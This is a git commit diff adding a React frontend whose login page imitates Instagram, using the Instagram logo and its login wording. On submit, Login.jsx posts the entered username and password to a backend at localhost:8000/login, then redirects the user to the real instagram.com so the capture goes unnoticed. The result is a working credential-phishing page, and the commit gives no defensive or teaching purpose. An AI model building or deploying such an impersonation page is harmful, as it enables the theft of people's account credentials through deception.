e143d29a2d2ded6df639628f018e2a12854225b4
Akshit Solanki <69105253+akshitsolanki@users.noreply.github.com>
2025-08-12 16:16:10 +0530

    Add files via upload

---
+++ frontend/src/App.jsx
@@ -0,0 +1,8 @@
+import React from "react";
+import Login from "./Login.jsx";
+
+function App() {
+  return <Login />;
+}
+
+export default App;
---
+++ frontend/src/Login.jsx
@@ -0,0 +1,59 @@
+import React, { useState } from "react";
+import "./Login.css"; // we will create this
+
+function Login() {
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    await fetch("http://localhost:8000/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, password }),
+    });
+    window.location.href = "https://www.instagram.com";
+  };
+
+  return (
+    <div className="login-container">
+      <div className="login-box">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg"
+          alt="Instagram"
+          className="logo"
+        />
+        <form onSubmit={handleSubmit}>
+          <input
+            type="text"
+            placeholder="Phone number, username, or email"
+            value={username}
+            onChange={(e) => setUsername(e.target.value)}
+            required
+          />
+          <input
+            type="password"
+            placeholder="Password"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            required
+          />
+          <button type="submit">Log In</button>
+        </form>
+        <div className="divider">
+          <div></div>
+          <span>OR</span>
+          <div></div>
+        </div>
+        <a href="https://www.facebook.com" className="fb-login">
+          Log in with Facebook
+        </a>
+        <a href="/" className="forgot-password">
+          Forgot password?
+        </a>
+      </div>
+    </div>
+  );
+}
+
+export default Login;
